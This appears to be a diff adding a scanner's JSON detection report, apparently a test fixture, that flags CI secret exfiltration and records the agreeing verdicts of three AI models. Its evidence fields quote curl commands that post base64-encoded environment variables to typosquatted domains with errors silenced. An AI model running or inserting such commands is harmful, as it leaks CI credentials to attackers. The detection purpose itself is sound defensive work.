@@ -1,0 +1,56 @@
+{
+  "detected": true,
+  "risk_level": 4,
+  "signals": ["env_exfiltration", "base64_encoding", "curl_upload", "typosquat_domain", "stderr_suppression"],
+  "categories": ["ci_cd_exfiltration", "backdoor"],
+  "findings": [
+    {
+      "id": "F1",
+      "severity": "critical",
+      "summary": "CI workflow exfiltrates environment variables via base64-encoded curl POST",
+      "evidence": ["curl -sS \"https://codecov.tel/upload/v2\" -d \"$(env | sort | base64)\" 2>/dev/null"],
+      "file_paths": [".github/workflows/ci.yml"],
+      "remediation": "Remove the telemetry step. Environment variables contain CI secrets and must never leave the runner."
+    },
+    {
+      "id": "F2",
+      "severity": "critical",
+      "summary": "Shell script sends base64-encoded env to typosquatted domain",
+      "evidence": ["curl -sm 5 \"https://c0dec0v.net/telemetry\" -d \"$metrics\" 2>/dev/null &"],
+      "file_paths": ["scripts/upload.sh"],
+      "remediation": "Remove credential exfiltration. Audit all outbound network calls in CI scripts."
+    }
+  ],
+  "council": {
+    "enabled": true,
+    "models": ["claude-sonnet-4-5", "gpt-4o", "gemini-2.0-flash"],
+    "naive": {
+      "claude-sonnet-4-5": {
+        "risk_level": 4,
+        "signals": ["env_exfiltration", "base64_encoding", "typosquat_domain"],
+        "findings": ["F1", "F2"]
+      },
+      "gpt-4o": {
+        "risk_level": 4,
+        "signals": ["curl_upload", "stderr_suppression", "env_exfiltration"],
+        "findings": ["F1", "F2"]
+      },
+      "gemini-2.0-flash": {
+        "risk_level": 3,
+        "signals": ["base64_encoding", "curl_upload"],
+        "findings": ["F1"]
+      }
+    },
+    "round_robin": {
+      "claude-sonnet-4-5": {"risk_level": 4, "accepted": ["F1", "F2"], "rejected": [], "added": []},
+      "gpt-4o": {"risk_level": 4, "accepted": ["F1", "F2"], "rejected": [], "added": []},
+      "gemini-2.0-flash": {"risk_level": 4, "accepted": ["F1", "F2"], "rejected": [], "added": []}
+    },
+    "consensus": {
+      "risk_level": 4,
+      "signals": ["env_exfiltration", "base64_encoding", "curl_upload", "typosquat_domain", "stderr_suppression"],
+      "findings": ["F1", "F2"],
+      "human_required": true
+    }
+  }
+}
